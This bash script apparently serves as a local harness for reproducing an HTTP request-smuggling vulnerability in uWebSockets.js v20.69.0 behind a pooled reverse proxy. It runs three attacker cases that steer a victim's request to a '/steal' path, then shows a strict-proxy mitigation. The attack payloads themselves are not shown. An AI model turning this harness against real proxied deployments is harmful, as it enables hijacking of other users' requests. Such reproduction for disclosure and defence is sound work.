#!/usr/bin/env bash
# End-to-end HTTP request-smuggling PoC against the REAL uWebSockets.js npm
# package (pinned to tag v20.69.0). The back-end is Node running uWebSockets.js;
# its HTTP layer is upstream uWebSockets' C++ HttpParser in a prebuilt .node
# binary, so it inherits upstream uWebSockets' HTTP-parsing behavior verbatim.
#
# Topology (all real TCP):
#     attacker ─┐                         ┌─ vuln_proxy  (:8080, ONE pooled conn) ─┐
#               ├─► reverse proxy ────────┤                                        ├─► uWebSockets.js (:9001)
#     victim  ─┘                         └─ strict_proxy (:8081, validates)       ┘
#
# Usage:
#   ./run.sh            # all three exploit cases (a,b,c) + the mitigation
#   ./run.sh a|b|c      # a single exploit case
#   ./run.sh mitigate   # only the strict-proxy mitigation
#
# Requires: node (22/24/26), go, and network access for the first `npm install`.
#
# NOTE ON PROCESS CLEANUP: background procs are killed BY PID (kill "$PID").
# We deliberately never `pkill -f <pattern>` — a pattern that matches this
# script's own command line would kill the running shell.
set -u
cd "$(dirname "$0")"
BE=127.0.0.1:9001
VP=127.0.0.1:8080
SP=127.0.0.1:8081

build() {
  echo "== building =="
  if [ ! -d node_modules/uWebSockets.js ]; then
    echo "-- npm install (fetching uWebSockets.js@v20.69.0 prebuilt binary) --"
    npm install --no-audit --no-fund || { echo "npm install failed"; exit 1; }
  fi
  for f in vuln_proxy strict_proxy attacker victim; do
    go build -o "$f" "$f.go" || exit 1
  done
}

# Wait until a host:port accepts a TCP connection (max ~10s).
# Connect-only readiness probe: it opens the port WITHOUT writing any bytes.
# (Writing even a newline to the vuln_proxy port would be forwarded to the
# pooled back-end connection and poison it before the attacker runs.) The
# subshell closes the fd on exit, so the probe connection is empty -> the
# proxy reads EOF and drops it without touching the pooled back-end conn.
wait_port() {
  local host=${1%:*} port=${1##*:}
  for _ in $(seq 1 50); do
    (exec 3<>"/dev/tcp/$host/$port") 2>/dev/null && return 0
    sleep 0.2
  done
  return 1
}

# Start a fresh back-end and record its PID.
start_be() {
  : > backend.log
  node backend_uwsjs.js 2>backend.log &
  BE_PID=$!
  wait_port "$BE" || { echo "backend did not come up"; cat backend.log; kill "$BE_PID" 2>/dev/null; exit 1; }
}

# Start a fresh vuln_proxy (fresh single pooled backend connection).
start_vp() {
  ./vuln_proxy "$BE" "$VP" >proxy.log 2>&1 &
  VP_PID=$!
  wait_port "$VP" || { echo "vuln_proxy did not come up"; cat proxy.log; kill "$VP_PID" "$BE_PID" 2>/dev/null; exit 1; }
}

start_sp() {
  ./strict_proxy "http://$BE" "$SP" >proxy.log 2>&1 &
  SP_PID=$!
  wait_port "$SP" || { echo "strict_proxy did not come up"; cat proxy.log; kill "$SP_PID" "$BE_PID" 2>/dev/null; exit 1; }
}

# Kill only the PIDs we started (never pkill -f).
stop() {
  for pid in "${VP_PID:-}" "${SP_PID:-}" "${BE_PID:-}"; do
    [ -n "$pid" ] && kill "$pid" 2>/dev/null
  done
  wait 2>/dev/null
  VP_PID=""; SP_PID=""; BE_PID=""
}

exploit_case() {
  local K=$1
  start_be
  start_vp
  echo
  echo "════════════════ EXPLOIT CASE $K  (attacker → vuln_proxy → pooled uWS.js ← victim) ════════════════"
  ./attacker "$VP" "$K"
  sleep 0.2
  ./victim "$VP"
  echo "---- uWebSockets.js parsed (ground truth) ----"; cat backend.log
  stop
}

mitigation() {
  start_be
  start_sp
  echo
  echo "════════════════ MITIGATION  (same attacks through the STRICT proxy :8081) ════════════════"
  for K in a b c; do echo "---- attacker case $K ----"; ./attacker "$SP" "$K" | sed -n '1,5p'; done
  echo "---- victim (legitimate) ----"; ./victim "$SP"
  echo "---- uWebSockets.js parsed (NO /steal, only the legit /account) ----"; cat backend.log
  stop
}

build
case "${1:-all}" in
  a|b|c) exploit_case "$1" ;;
  mitigate) mitigation ;;
  all) exploit_case a; exploit_case b; exploit_case c; mitigation ;;
  *) echo "usage: $0 [a|b|c|mitigate]"; exit 2 ;;
esac
echo
echo "[done]"
exit 0
